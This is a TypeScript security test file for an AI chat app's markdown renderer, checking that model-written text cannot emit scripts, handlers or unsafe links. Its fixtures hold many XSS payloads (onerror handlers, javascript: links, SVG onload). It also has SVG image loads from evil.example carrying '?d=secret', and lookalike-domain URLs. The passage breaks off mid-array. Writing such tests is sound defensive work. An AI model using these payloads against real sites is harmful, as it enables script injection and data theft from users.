/**
 * Checks that nothing a model writes can become markup.
 *
 * The renderer escapes every piece of source it places and builds the markup
 * around it, which is the whole security argument for having written one
 * instead of reaching for a parser plus a sanitizer. That argument is only as
 * good as the ordering, and the ordering is easy to break by adding a rule that
 * emits an attribute - so it is worth asserting rather than commenting.
 *
 * This matters more than it used to: the shared HTML export runs assistant text
 * through the same function, and that file is opened directly in a browser,
 * outside the app's own CSP. And a reply now carries live links, pictures,
 * KaTeX, path chips and diagrams, each a new way for an attribute to appear.
 *
 * The test is not "does the output contain a scary word". Escaped text contains
 * scary words - `&lt;img src=x onerror=alert(1)&gt;` is inert, and reading it as
 * a finding is how the first version of this check produced four false alarms.
 * What matters is which tags and attributes the renderer actually emitted, and
 * what the attributes that can navigate or load say, so that is what is inspected.
 */
import fs from "node:fs"
import path from "node:path"
import { detectPath, renderMarkdown, renderReply, type MarkdownOptions } from "../src/renderer/src/lib/markdown"
import { ABC_SOURCE_LIMIT } from "../src/renderer/src/lib/abc-play"
import {
  COVER_LIMIT,
  coverAnswer,
  coverProxyAddress,
  coverRedirect,
  coverRequest,
  parsePlatformLink,
  platformLinksIn,
  readMediaMeta,
} from "../src/shared/media-platform"
import { isSvgFile, stripSvgHazards, svgSize } from "../src/renderer/src/lib/svg-safe"

/* A reply while it is still arriving, with everything a finished reply gets. */
const LIVE: MarkdownOptions = {
  codeActions: { copy: "Copy", copied: "Copied", label: "Copy code" },
  tableActions: { label: "Table", preview: "Preview", copy: "Copy table" },
  videoCards: { tip: "Preview", fallback: "Video" },
  math: true,
  links: { imageTip: "Preview" },
  paths: { tip: "Open" },
  diagrams: { streaming: true },
  lineNumbers: true,
  live: true,
}

/** Everything the renderer is allowed to produce, KaTeX's generated markup included. Anything else came from the source. */
const TAGS = new Set([
  "p", "br", "h1", "h2", "h3", "h4", "h5", "h6",
  "strong", "em", "del", "code", "pre", "ul", "ol", "li",
  "blockquote", "span", "table", "thead", "tbody", "tr", "th", "td", "hr",
  "div", "button", "a", "img", "input", "sup", "section",
  // The renderer's own icons, and KaTeX's drawn radicals and braces.
  "svg", "path", "rect", "line",
])
const ATTRIBUTES = new Set([
  "class", "data-level", "data-lang", "href", "rel", "src", "alt", "title", "loading", "role", "tabindex",
  "type", "disabled", "checked", "start", "dir", "aria-label", "aria-hidden", "style",
  "width", "height", "viewbox", "fill", "stroke", "stroke-width", "stroke-linecap", "stroke-linejoin",
  "d", "x", "y", "rx", "x1", "x2", "y1", "y2", "xmlns", "preserveaspectratio",
])

const OPEN_TAG = /<\s*([a-zA-Z][\w-]*)((?:[^>"']|"[^"]*"|'[^']*')*)>/g
const CLOSE_TAG = /<\s*\/\s*([a-zA-Z][\w-]*)\s*>/g
const ATTRIBUTE = /([^\s"'=/>]+)(?:\s*=\s*("[^"]*"|'[^']*'|[^\s>]+))?/g

const COPY = { copy: "Copy", copied: "Copied", label: "Copy code" }
const OPTIONS: [string, MarkdownOptions][] = [
  ["plain", {}],
  [
    "reply",
    {
      codeActions: COPY,
      tableActions: { label: "Table", preview: "Preview", copy: "Copy table" },
      videoCards: { tip: "Preview", fallback: "Video" },
      math: true,
      links: { imageTip: "Preview", remoteImage: "Load" },
      paths: { tip: "Open" },
      diagrams: { streaming: false },
      lineNumbers: true,
    },
  ],
  ["streaming", { math: true, links: { imageTip: "Preview" }, paths: { tip: "Open" }, diagrams: { streaming: true }, lineNumbers: true }],
]

/* Without the renderer's own icons, so any <svg> in the output could only have come from the source. */
const NO_ICONS: MarkdownOptions = { math: true, links: { imageTip: "Preview" }, paths: { tip: "Open" }, diagrams: { streaming: false } }

const HOSTILE: { name: string; source: string }[] = [
  { name: "a script tag", source: "<script>alert(1)</script>" },
  { name: "an image with an error handler", source: '<img src=x onerror="alert(1)">' },
  { name: "a script tag inside a fenced block", source: "```\n<script>alert(1)</script>\n```" },
  { name: "a script tag inside inline code", source: "`<script>alert(1)</script>`" },
  { name: "markup inside a heading", source: "# <script>alert(1)</script>" },
  { name: "markup inside a list item", source: "- <img src=x onerror=alert(1)>" },
  { name: "markup inside a nested list item", source: "- a\n  - <img src=x onerror=alert(1)>" },
  { name: "markup inside a task item", source: "- [x] <img src=x onerror=alert(1)>" },
  { name: "markup inside a blockquote", source: "> <script>alert(1)</script>" },
  { name: "markup inside bold", source: "**<script>alert(1)</script>**" },
  { name: "markup inside strike", source: "~~<script>alert(1)</script>~~" },
  { name: "a javascript: link", source: "[click](javascript:alert(1))" },
  { name: "a mixed-case javascript: link", source: "[click](JaVaScRiPt:alert(1))" },
  { name: "a data: link", source: "[click](data:text/html,alert(1))" },
  { name: "a quote breaking out of an attribute", source: '[x](" onmouseover="alert(1))' },
  { name: "a quote breaking out of a web link", source: '[x](https://a.example/" onclick="alert(1))' },
  { name: "a link whose text is markup", source: "[<img src=x onerror=alert(1)>](https://example.com)" },
  { name: "a bare address carrying a quote", source: 'see https://a.example/"onmouseover="alert(1) now' },
  { name: "a bare address running into markup", source: "www.example.com/<script>alert(1)</script>" },
  { name: "an angle-bracket javascript: address", source: "<javascript:alert(1)>" },
  { name: "a javascript: address in inline code", source: "`javascript:alert(1)`" },
  { name: "a web address in inline code with a quote", source: '`https://a.example/"onclick="x`' },
  { name: "a picture with a javascript: address", source: "![x](javascript:alert(1))" },
  { name: "a picture whose alt text breaks out", source: '![x" onerror="alert(1)](https://a.example/b.png)' },
  { name: "a picture whose address breaks out", source: '![x](https://a.example/b.png" onerror="alert(1))' },
  { name: "a picture link whose address breaks out", source: '[t](https://a.example/a.png"onerror=alert(1)//)' },
  { name: "an svg data picture", source: "![](data:image/svg+xml,<svg onload=alert(1)>)" },
  { name: "a fence language carrying an attribute", source: '```js" onload="alert(1)\ncode\n```' },
  { name: "a fence language carrying a tag", source: "```<script>\ncode\n```" },
  { name: "an unclosed tag", source: "<div" },
  { name: "an entity that should stay literal", source: "&lt;script&gt;" },
  { name: "a table cell with markup", source: "| a |\n| - |\n| <b>x</b> |" },
  { name: "a table whose source breaks out", source: '| a |\n| - |\n| "><script>alert(1)</script> |' },
  { name: "a Windows path breaking out", source: '`C:\\a\\"><img src=x onerror=alert(1)>.png`' },
  { name: "a POSIX path breaking out", source: '`/tmp/a" onclick="alert(1).md`' },
  { name: "a relative path with a tag", source: "`../<script>alert(1)</script>.pdf`" },
  { name: "a bare name with a scheme", source: "`javascript:alert(1).md`" },
  { name: "a single-path fence breaking out", source: '```\n/Users/x/"><svg onload=alert(1)>.pdf\n```' },
  { name: "a local picture breaking out", source: '![](/tmp/"><img src=x onerror=alert(1)>.png)' },
  { name: "KaTeX asked for a link", source: "$\\href{javascript:alert(1)}{x}$" },
  { name: "KaTeX asked for a url", source: "$$\n\\url{javascript:alert(1)}\n$$" },
  { name: "KaTeX asked for a class", source: "$\\htmlClass{x}{y}$ and $\\htmlStyle{color:red}{y}$" },
  { name: "KaTeX asked for a picture", source: "$\\includegraphics{https://a.example/x.png}$" },
  { name: "markup inside inline math", source: "$<img src=x onerror=alert(1)>$" },
  { name: "markup inside bracket math", source: "\\(</p><script>alert(1)</script>\\)" },
  { name: "markup inside a math fence", source: "```math\n<script>alert(1)</script>\n```" },
  { name: "a colour that is not a colour", source: "$\\color{red;background:url(https://a.example)}{x}$" },
  { name: "raw svg with a script, a handler and a foreignObject", source: '<svg onload="alert(1)"><script>alert(1)</script><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>' },
  { name: "an svg fence with a javascript: link", source: '```svg\n<svg><a href="javascript:alert(1)"><text>x</text></a></svg>\n```' },
  { name: "an unfinished svg while streaming", source: '<svg onload="alert(1)"><script>' },
  { name: "a mermaid label with markup", source: '```mermaid\ngraph TD; A["<img src=x onerror=alert(1)>"]\n```' },
  { name: "a footnote with markup", source: "a[^1]\n\n[^1]: <script>alert(1)</script>" },
  { name: "a footnote label breaking out", source: 'a[^x"onclick="y]\n\n[^x"onclick="y]: note' },
]

const problems: string[] = []

function inspect(name: string, html: string) {
  for (const match of html.matchAll(OPEN_TAG)) {
    const [, tag, rest] = match
    if (!TAGS.has(tag.toLowerCase())) problems.push(`${name}: emitted <${tag}>`)
    for (const attribute of rest.matchAll(ATTRIBUTE)) {
      const key = attribute[1].toLowerCase()
      const value = (attribute[2] ?? "").replace(/^["']|["']$/g, "")
      if (!ATTRIBUTES.has(key) && !key.startsWith("data-")) problems.push(`${name}: emitted the attribute ${key}= on <${tag}>`)
      if (key.startsWith("on")) problems.push(`${name}: emitted a handler ${key}= on <${tag}>`)
      // What can navigate or load is checked by value, not only by name.
      if (key === "href" && !/^(https?:\/\/|#md-fn)/i.test(value)) problems.push(`${name}: a link to ${value}`)
      // round 8: a web picture is never drawn straight away - it waits for a click - so only inline pictures have a src.
      if (key === "src" && !/^data:image\/(png|jpe?g|gif|webp|avif|bmp);/i.test(value)) problems.push(`${name}: a picture from ${value}`)
      if (key === "data-fallback-href" && !/^https?:\/\//i.test(value)) problems.push(`${name}: a fallback link to ${value}`)
      if (key === "style" && /url\(|expression|javascript:|@import/i.test(value)) problems.push(`${name}: a style that loads or runs: ${value}`)
    }
  }
  for (const match of html.matchAll(CLOSE_TAG)) {
    if (!TAGS.has(match[1].toLowerCase())) problems.push(`${name}: emitted </${match[1]}>`)
  }
}

const htmlOf = (source: string, options: MarkdownOptions) =>
  renderReply(source, options)
    .map((block) => (block.kind === "html" ? block.html : ""))
    .join("\n")

for (const item of HOSTILE) {
  for (const [label, options] of OPTIONS) inspect(`${item.name} (${label})`, htmlOf(item.source, options))
  inspect(`${item.name} (string)`, renderMarkdown(item.source, OPTIONS[1][1]))
  // Nothing drawn from source may be an svg, a script or a foreignObject when the renderer draws no icons itself.
  const bare = htmlOf(item.source, NO_ICONS)
  if (/<\s*(svg|script|foreignObject)\b/i.test(bare.replace(/<span class="katex[\s\S]*?<\/span>/g, "")) && !/\$/.test(item.source)) {
    problems.push(`${item.name}: markup that is not the renderer's own came through`)
  }
}

/* The javascript: link must not become a link in any form. */
for (const source of ["[click](javascript:alert(1))", "<javascript:alert(1)>", "`javascript:alert(1)`", "javascript:alert(1)"]) {
  if (/<a\b/.test(htmlOf(source, OPTIONS[1][1]))) problems.push(`${JSON.stringify(source)} became a link`)
}

/* The SVG pre-pass, which runs before DOMPurify in the diagram component. */
const SVG_CASES: [string, string, RegExp][] = [
  ["a script", "<svg><script>alert(1)</script><rect/></svg>", /<script/i],
  ["an unclosed script", "<svg><rect/><script>alert(1)", /<script/i],
  ["an event handler", '<svg onload="alert(1)"><rect onclick=\'x\' /></svg>', /\son[a-z]+\s*=/i],
  ["an unquoted handler", "<svg><rect onmouseover=alert(1) /></svg>", /\son[a-z]+\s*=/i],
  ["a foreignObject", "<svg><foreignObject><div>x</div></foreignObject></svg>", /foreignObject/i],
  ["a javascript: link", '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>', /javascript:/i],
  ["a javascript: xlink", "<svg><a xlink:href='javascript:alert(1)'><text>x</text></a></svg>", /javascript:/i],
  ["a data: use", '<svg><use href="data:image/svg+xml,&lt;svg onload=alert(1)&gt;"/></svg>', /href\s*=\s*"data:/i],
  // round 8: a drawing never fetches from the web on its own.
  ["a web image", '<svg><image href="https://evil.example/p.png?d=secret" /></svg>', /evil\.example/i],
  ["a protocol-relative xlink image", "<svg><image xlink:href='//evil.example/p.png' /></svg>", /evil\.example/i],
  ["a web feImage", '<svg><filter><feImage href=https://evil.example/x /></filter></svg>', /evil\.example/i],
  ["a web url() in a style", '<svg><rect style="fill:url(https://evil.example/x#p)" /></svg>', /evil\.example/i],
  ["a web @import", "<svg><style>@import url(https://evil.example/a.css);</style></svg>", /evil\.example/i],
]
for (const [name, source, hazard] of SVG_CASES) {
  if (hazard.test(stripSvgHazards(source))) problems.push(`the svg pre-pass let through ${name}`)
}
if (!/href="https:\/\/example\.com"/.test(stripSvgHazards('<svg><a href="https://example.com"><text>x</text></a></svg>'))) {
  problems.push("the svg pre-pass removed an ordinary link, which only a click follows")
}
if (!/foreignObject/.test(stripSvgHazards("<svg><foreignObject><div>x</div></foreignObject></svg>", true))) {
  problems.push("the svg pre-pass removed mermaid's foreignObject labels")
}

/*
 * The formatting still has to work, or a renderer that escaped everything and
 * emitted nothing would sail through the checks above.
 */
const NEWLINE = String.fromCharCode(10)
const TABLE = ["| a | b |", "| --- | --- |", "| 1 | 2 |"].join(NEWLINE)
const ALIGNED = ["| l | r |", "| :-- | --: |", "| 1 | 2 |"].join(NEWLINE)
const REPLY = OPTIONS[1][1]

const shape: [string, string, RegExp, MarkdownOptions?][] = [
  ["a heading", "## Title", /data-level="2"[^>]*>Title</],
  ["a sixth-level heading", "###### Deep", /<h6 class="md-h" data-level="6">Deep<\/h6>/],
  ["bold", "**loud**", /<strong>loud<\/strong>/],
  ["strike", "~~gone~~", /<del>gone<\/del>/],
  ["inline code", "`x = 1`", /<code>x = 1<\/code>/],
  ["a fenced block", "```\nx\n```", /<pre/],
  ["a bullet list", "- one\n- two", /<li[^>]*>one<\/li>/],
  ["a nested list", "- a\n  - b", /<ul class="md-list"><li>a<ul class="md-list"><li>b<\/li><\/ul><\/li><\/ul>/],
  ["an ordered list's start", "3. x\n4. y", /<ol class="md-list" start="3"><li>x<\/li><li>y<\/li><\/ol>/],
  ["a task list", "- [x] done\n- [ ] todo", /<li class="md-task"><input type="checkbox" class="md-task-box" disabled checked \/>done<\/li><li class="md-task"><input type="checkbox" class="md-task-box" disabled \/>todo<\/li>/],
  ["lines joined in one paragraph", "one\ntwo", /^<p class="md-p">one<br>two<\/p>$/],
  ["a link's text and url, off the reply", "[text](https://example.com)", /text.*example\.com/],
  // Tables. A reply containing a table once arrived as three lines of raw pipes while every check passed.
  ["a table's head", TABLE, /<table class="md-table">[\s\S]*<th>a<\/th>/],
  ["a table's body", TABLE, /<td class="md-num">1<\/td><td class="md-num">2<\/td>/],
  ["a column the delimiter aligned", ALIGNED, /<th class="md-right">r<\/th>/],
  ["a table keeps its source", TABLE, /data-md-source="\| a \| b \|\n\| --- \| --- \|\n\| 1 \| 2 \|"/, REPLY],
  // The negative case, which matters more here than the positive ones: a shell pipe must stay prose.
  ["a piped command is not a table", "run `ls | grep x` to see", /^<p class="md-p">run <code>/],
  ["and a rule is still a rule", ["text", "", "---", "", "more"].join(NEWLINE), /<hr class="md-rule"/],
  ["line numbers", "```js\na\nb\n```", /<code><span class="line">a<\/span>\n<span class="line">b<\/span><\/code>/, REPLY],
  // Links.
  ["a live link", "[text](https://example.com)", /<a class="md-link" href="https:\/\/example\.com" rel="noreferrer">text<\/a>/, REPLY],
  ["a bare address, Chinese punctuation trimmed", "见 https://example.com/a，好的", /<a class="md-link" href="https:\/\/example\.com\/a" rel="noreferrer">https:\/\/example\.com\/a<\/a>，好的/, REPLY],
  ["a www address", "at www.example.com.", /href="http:\/\/www\.example\.com"/, REPLY],
  ["an address in bold", "**https://example.com/x**", /<strong><a class="md-link" href="https:\/\/example\.com\/x"/, REPLY],
  ["an address in inline code", "`https://example.com`", /<a class="md-link md-link-code" href="https:\/\/example\.com"/, REPLY],
  ["a relative link keeps its words", "[docs](docs/a.md)", /^<p class="md-p">docs<\/p>$/, REPLY],
  ["a footnote", "said[^1]\n\n[^1]: the note", /said<sup class="md-fnref"><a class="md-fnref-link" href="#md-fn-1" data-footnote-ref="1">1<\/a><\/sup>[\s\S]*<section class="md-footnotes" data-footnotes><ol><li data-footnote="1">the note/, REPLY],
  // Pictures.
  // round 8: a web picture waits for a click, so it is a placeholder naming where it would load from.
  ["a picture", "![a cat](https://example.com/cat.png)", /<button type="button" class="md-img-remote" data-remote-src="https:\/\/example\.com\/cat\.png" data-remote-alt="a cat"[^>]*>[\s\S]*example\.com<\/span><\/button>/, REPLY],
  ["a picture link", "[cat](https://example.com/cat.png)", /<button type="button" class="md-img-remote md-img-link" [^>]*data-fallback-href="https:\/\/example\.com\/cat\.png"/, REPLY],
  ["an inline picture still shows at once", "![dot](data:image/png;base64,iVBORw0KGgo=)", /<img class="md-img" src="data:image\/png;base64,iVBORw0KGgo="/, REPLY],
  ["a local picture by path", "![](/tmp/shot.png)", /<span class="md-media" data-media="image" data-media-path="\/tmp\/shot\.png">/, REPLY],
  // Paths.
  ["an absolute file", "`/Users/me/report.pdf`", /<code class="md-path" role="button" tabindex="0" data-path="\/Users\/me\/report\.pdf" data-path-kind="open" title="Open">/, REPLY],
  ["an absolute text file resolves", "`C:\\work\\notes.md`", /data-path-kind="resolve"/, REPLY],
  ["a relative file", "`src/readme.md`", /data-path="src\/readme\.md" data-path-kind="resolve"/, REPLY],
  ["a bare name has no action", "`report.docx`", /<code class="md-path" data-path="report\.docx" data-path-kind="name">report\.docx<\/code>/, REPLY],
  ["a folder", "`/Users/me/project/`", /data-path-kind="dir"/, REPLY],
  ["a picture path is a card", "`/tmp/a b/shot.png`", /<span class="md-media" data-media="image" data-media-path="\/tmp\/a b\/shot\.png">/, REPLY],
  ["a video path is a player", "`D:\\clips\\demo.webm`", /data-media="video"/, REPLY],
  ["a path alone in a fence", "```\n/Users/me/report.pdf\n```", /^<p class="md-p"><code class="md-path" role="button"/, REPLY],
  ["code that is not a path", "`npm run build`", /<code>npm run build<\/code>/, REPLY],
  // Math.
  ["inline math", "area $\\pi r^2$ here", /<span class="katex">/, REPLY],
  ["display math", "$$\n\\frac{1}{2}\n$$", /<div class="md-math"><span class="katex-display">/, REPLY],
  ["a math fence", "```math\nx^2\n```", /<span class="katex-display">/, REPLY],
  ["bracket delimiters", "so \\(a+b\\) and\n\\[\\sum_i i\\]", /<span class="katex">[\s\S]*<span class="katex-display">/, REPLY],
  ["a bare bracket block", "[\n\\frac{a}{b}\n]", /<span class="katex-display">/, REPLY],
  ["a bad formula shows its error", "$\\frac{$", /katex-error|\$\\frac\{\$/, REPLY],
]

for (const [name, source, expected, options] of shape) {
  const html = options ? htmlOf(source, options) : renderMarkdown(source)
  if (!expected.test(html)) problems.push(`${name} no longer renders: ${html.slice(0, 220)}`)
}

/* Currency is prose, not math. */
if (/katex/.test(htmlOf("It costs $5 and $10, or $6.", REPLY))) problems.push("currency was read as math")

/* Blocks: diagrams leave as source, and only once the reply has finished. */
const blockCases: [string, string, MarkdownOptions, (kinds: string) => boolean][] = [
  ["a mermaid fence is a diagram", "```mermaid\ngraph TD; A-->B\n```", REPLY, (kinds) => kinds === "diagram:mermaid"],
  ["a mermaid fence stays code while streaming", "```mermaid\ngraph TD; A-->B\n```", OPTIONS[2][1], (kinds) => kinds === "html"],
  ["an svg fence is a diagram", "```svg\n<svg viewBox=\"0 0 10 10\"><rect width=\"5\" height=\"5\"/></svg>\n```", REPLY, (kinds) => kinds === "diagram:svg"],
  ["raw svg is a diagram", "Here:\n<svg viewBox=\"0 0 10 10\"><rect/></svg>\nDone.", REPLY, (kinds) => kinds === "html diagram:svg html"],
  ["an unfinished svg shows the loading line", "Here:\n<svg viewBox=\"0 0 10 10\"><rect", OPTIONS[2][1], (kinds) => kinds === "html svg-loading"],
]
for (const [name, source, options, test] of blockCases) {
  const kinds = renderReply(source, options)
    .map((block) => (block.kind === "diagram" ? `diagram:${block.mode}` : block.kind))
    .join(" ")
  if (!test(kinds)) problems.push(`${name}: blocks were ${kinds}`)
}

/* MiMo's path rules, directly. */
const PATHS: [string, string | undefined][] = [
  ["/Users/me/a.pdf", "open"],
  ["/Users/me/a.md", "resolve"],
  ["C:/work/a.xlsx", "open"],
  ["./docs/a.md", "resolve"],
  ["../a/b.docx", "resolve"],
  ["a.docx", "name"],
  ["C:\\Users\\me", "dir"],
  ["/usr/local/lib/", "dir"],
  ["/api/users", undefined],
  ["/usr/bin/env.exe", undefined],
  ["https://example.com/a.pdf", undefined],
  ["npm install", undefined],
]
for (const [value, kind] of PATHS) {
  const hit = detectPath(value)
  if (hit?.kind !== kind) problems.push(`the path ${value} was ${hit?.kind ?? "not a path"}, not ${kind ?? "not a path"}`)
}

/* A reply still arriving: MiMo's live block. */
const liveHtml = (source: string) => htmlOf(source, LIVE)
const liveCases: [string, string, (html: string) => boolean][] = [
  ["the unfinished line stays plain", "one\n**bo", (html) => /<p class="md-p">one<\/p>/.test(html) && /<div class="stream-open-line">\*\*bo<\/div>$/.test(html) && !/<strong>/.test(html)],
  ["a finished line is markdown again", "one **bold**\n", (html) => /<strong>bold<\/strong>/.test(html) && !/stream-open-line/.test(html)],
  ["an underline waits instead of making a heading", "Title\n---", (html) => !/<h\d|<hr/.test(html) && /<div class="stream-open-line">Title<\/div>/.test(html)],
  ["a pipe block that is not a table yet shows nothing", "Intro\n\n| a | b", (html) => /Intro/.test(html) && !/\| a/.test(html) && !/<table/.test(html)],
  ["a table with its delimiter row is drawn", "| a | b |\n| --- | --- |\n| 1", (html) => /<table/.test(html) && !/stream-open-line/.test(html)],
  ["a line inside an open fence stays in the code", "```js\nconst a = 1\nconst b", (html) => /<pre/.test(html) && /const b/.test(html) && !/stream-open-line/.test(html)],
  ["footnotes wait for the end", "said[^1]\n\n[^1]: the note\n", (html) => /data-footnote-ref="1"/.test(html) && !/data-footnotes/.test(html)],
  ["a reference is one before its note arrives", "said[^2] more\n", (html) => /data-footnote-ref="1"/.test(html)],
]
for (const [name, source, test] of liveCases) {
  const html = liveHtml(source)
  if (!test(html)) problems.push(`live: ${name}: ${html.slice(0, 220)}`)
}
if (!/data-footnotes/.test(htmlOf("said[^1]\n\n[^1]: the note\n", REPLY))) problems.push("footnotes no longer show once the reply has ended")

/* MiMo's SVG file card: which paths get it, where it mounts, and the file's markup before it is ever made a picture. */
const SVG_FILES: [string, boolean][] = [
  ["/Users/me/diagram.svg", true],
  ["C:\\work\\Logo.SVG", true],
  ["./a.svg?v=2#x", true],
  ["/tmp/a.svgz", false],
  ["/tmp/a.png", false],
  ["/tmp/svg", false],
]
for (const [file, want] of SVG_FILES) if (isSvgFile(file) !== want) problems.push(`svg card: ${file} ${want ? "should" : "should not"} get the card`)
if (!/<span class="md-media" data-media="image" data-media-path="\/Users\/me\/diagram\.svg">/.test(htmlOf("`/Users/me/diagram.svg`", REPLY))) {
  problems.push("svg card: an .svg path no longer mounts a media card")
}
if (!/data-media="image" data-media-path="\.\/art\/logo\.svg"/.test(htmlOf("![logo](./art/logo.svg)", REPLY))) {
  problems.push("svg card: a local .svg picture no longer mounts a media card")
}
inspect("svg card: a path breaking out", htmlOf('`/tmp/"><svg onload=alert(1)>.svg`', REPLY))
const FILE_SVG =
  '<?xml version="1.0"?>\n<!DOCTYPE svg>\n<svg xmlns="http://www.w3.org/2000/svg" width="120" height="80" onload="alert(1)">' +
  '<script>alert(1)</script><foreignObject><div>x</div></foreignObject><a xlink:href="javascript:alert(1)"><rect width="10" height="10"/></a></svg>'
const cleanFile = stripSvgHazards(FILE_SVG)
if (/<script|foreignObject|\son[a-z]+\s*=|javascript:/i.test(cleanFile)) problems.push(`svg card: the pre-pass let a file's hazard through: ${cleanFile}`)
if (JSON.stringify(svgSize(cleanFile)) !== '{"w":120,"h":80}') problems.push(`svg card: a file's own size was read as ${JSON.stringify(svgSize(cleanFile))}`)
if (JSON.stringify(svgSize('<svg viewBox="0 0 30 20"></svg>')) !== '{"w":30,"h":20}') problems.push("svg card: a viewBox no longer gives the picture's size")
if (JSON.stringify(svgSize("<svg></svg>")) !== '{"w":800,"h":600}') problems.push("svg card: a picture with no size no longer falls back to 800 by 600")

/*
 * Round 4: MiMo's ABC score block and its video platform cards.
 *
 * An abc fence leaves the renderer as its source alone (the block draws it with
 * abcjs and sanitises that), so the markup that can carry model text is the
 * code block it falls back to - while streaming, when unclosed, nested or over
 * MiMo's cap, and in the plain string form. A platform card may only ever put
 * one of the two player addresses in a frame, so a lookalike host must not be
 * read as a platform, and the content policy must name exactly those players.
 */
const ABC_HOSTILE: { name: string; source: string }[] = [
  { name: "an abc fence with a script in its title", source: "```abc\nX:1\nT:<script>alert(1)</script>\nK:C\nCDEF|\n```" },
  { name: "an abc fence of markup", source: '```abc\n<img src=x onerror="alert(1)"><svg onload=alert(1)>\n```' },
  { name: "an abc fence language breaking out", source: '```abc" onload="alert(1)\nX:1\nK:C\nC|\n```' },
  { name: "an unfinished abc fence", source: "```abc\nX:1\nT:<script>alert(1)</script>" },
  { name: "an abc fence in a list", source: "- item\n\n  ```abc\n  <script>alert(1)</script>\n  ```" },
]
for (const item of ABC_HOSTILE) {
  for (const [label, options] of OPTIONS) inspect(`${item.name} (${label})`, htmlOf(item.source, options))
  inspect(`${item.name} (live)`, htmlOf(item.source, LIVE))
  inspect(`${item.name} (string)`, renderMarkdown(item.source, REPLY))
  if (/<\s*(script|img|svg)\b/i.test(htmlOf(item.source, NO_ICONS))) problems.push(`${item.name}: raw markup came through`)
  // A score block carries the source and nothing else: no html of its own.
  for (const block of renderReply(item.source, REPLY)) if (block.kind === "abc" && Object.keys(block).join(",") !== "kind,code") problems.push(`${item.name}: a score block carried more than its source`)
}

const ABC_TUNE = "```abc\nX:1\nT:Scale\nM:4/4\nK:C\nCDEF GABc|\n```"
/* "abc" is exactly one score block; "code" is markup only, with no score block anywhere (a live reply may also hold back its last line). */
const abcBlockCases: [string, string, MarkdownOptions, "abc" | "code"][] = [
  ["an abc fence is a score", ABC_TUNE, REPLY, "abc"],
  ["an ABC fence in capitals is a score", ABC_TUNE.replace("```abc", "```ABC"), REPLY, "abc"],
  ["an abc fence stays code while streaming", ABC_TUNE, OPTIONS[2][1], "code"],
  ["an abc fence stays code while live", ABC_TUNE, LIVE, "code"],
  ["an unclosed abc fence stays code", "```abc\nX:1\nK:C\nC|", REPLY, "code"],
  ["an abc fence in a list stays code", "- a\n\n  ```abc\n  X:1\n  K:C\n  C|\n  ```", REPLY, "code"],
  ["an abc fence past MiMo's cap stays code", "```abc\nX:1\nK:C\n" + "C".repeat(ABC_SOURCE_LIMIT) + "\n```", REPLY, "code"],
]
for (const [name, source, options, want] of abcBlockCases) {
  const blocks = renderReply(source, options)
  const kinds = blocks.map((block) => block.kind).join(" ")
  const ok = want === "abc" ? kinds === "abc" : blocks.length > 0 && blocks.every((block) => block.kind === "html")
  if (!ok) problems.push(`${name}: blocks were ${kinds}`)
}
if (!/<pre class="md-code md-lined" data-lang="abc">/.test(renderMarkdown(ABC_TUNE, REPLY))) problems.push("an abc fence no longer falls back to a code block in the string form")

const PLATFORM_LINKS: [string, string | undefined][] = [
  ["https://www.bilibili.com/video/BV1GJ411x7h7", "bilibili"],
  ["https://m.bilibili.com/video/av170001/", "bilibili"],
  ["https://b23.tv/abc123", "bilibili"],
  ["https://www.youtube.com/watch?v=dQw4w9WgXcQ", "youtube"],
  ["https://youtu.be/dQw4w9WgXcQ?t=4", "youtube"],
  ["https://m.youtube.com/shorts/dQw4w9WgXcQ", "youtube"],
  ["https://www.douyin.com/video/7300000000000000000", "douyin"],
  ["https://www.douyin.com/discover?modal_id=7300000000000000000", "douyin"],
  ["https://v.qq.com/x/cover/abc/def.html", "tencent"],
  ["https://www.netflix.com/title/80100172", "netflix"],
  // Lookalikes and near misses: none of these is a platform.
  ["https://bilibili.com.evil.example/video/BV1GJ411x7h7", undefined],
  ["https://evilbilibili.com/video/BV1GJ411x7h7", undefined],
  ["https://www.bilibili.com.evil.example/video/BV1GJ411x7h7", undefined],
  ["https://www.youtube.com.evil.example/watch?v=dQw4w9WgXcQ", undefined],
  ["https://notyoutube.com/watch?v=dQw4w9WgXcQ", undefined],
  ["https://youtube.com@evil.example/watch?v=dQw4w9WgXcQ", undefined],
  ["https://youtu.be.evil.example/dQw4w9WgXcQ", undefined],
  ["https://evil.example/watch?v=dQw4w9WgXcQ&from=https://youtube.com", undefined],
  ["https://www.netflix.com.evil.example/title/80100172", undefined],
  ["https://b23.tv.evil.example/abc123", undefined],
  ["https://www.douyin.com/discover?modal_id=12", undefined],
  ["https://www.bilibili.com/video/BV1GJ411x7h7/extra", undefined],
  ["https://www.youtube.com/watch?v=short", undefined],
  ["ftp://www.youtube.com/watch?v=dQw4w9WgXcQ", undefined],
]
for (const [address, platform] of PLATFORM_LINKS) {
  const link = parsePlatformLink(address)
  if (link?.platform !== platform) problems.push(`platform: ${address} was ${link?.platform ?? "no platform"}, not ${platform ?? "no platform"}`)
  if (!platform && platformLinksIn(`see ${address} now`).length) problems.push(`platform: the lookalike ${address} became a card`)
}
if (platformLinksIn("`https://youtu.be/dQw4w9WgXcQ`\n```\nhttps://youtu.be/dQw4w9WgXcQ\n```").length) problems.push("platform: a link in code became a card")
if (platformLinksIn("[a](https://youtu.be/dQw4w9WgXcQ) and https://youtu.be/dQw4w9WgXcQ。").join() !== "https://youtu.be/dQw4w9WgXcQ") problems.push("platform: a link written twice is not one card")

/* A card from the main process is checked again: a forged cover is dropped, a lookalike link is no card. */
const forged = readMediaMeta({ kind: "video", platform: "youtube", url: "https://youtu.be/dQw4w9WgXcQ", title: "x", coverUrl: "javascript:alert(1)", aspect: "16:9" })
if (!forged || forged.coverUrl !== "") problems.push(`card: a forged card kept its cover: ${JSON.stringify(forged)}`)
if (readMediaMeta({ kind: "video", platform: "youtube", url: "https://youtube.com.evil.example/watch?v=dQw4w9WgXcQ", title: "x", coverUrl: "", aspect: "16:9" })) {
  problems.push("card: a card for a lookalike link was accepted")
}

/* The cover proxy: which addresses it fetches, and what it refuses. */
const proxied = (address: string) => `mcode-media://proxy/?u=${encodeURIComponent(address)}`
const COVER_REQUESTS: [string, string, number | string][] = [
  [proxied("https://i0.hdslb.com/bfs/archive/a.jpg"), "GET", "https://www.bilibili.com/"],
  [proxied("https://hdslb.com/a.jpg"), "GET", "https://www.bilibili.com/"],
  [proxied("https://I.YTIMG.COM/vi/x/hqdefault.jpg"), "GET", "https://www.youtube.com/"],
  [proxied("https://p16-sign.tiktokcdn-us.com/a.jpg"), "GET", "https://www.tiktok.com/"],
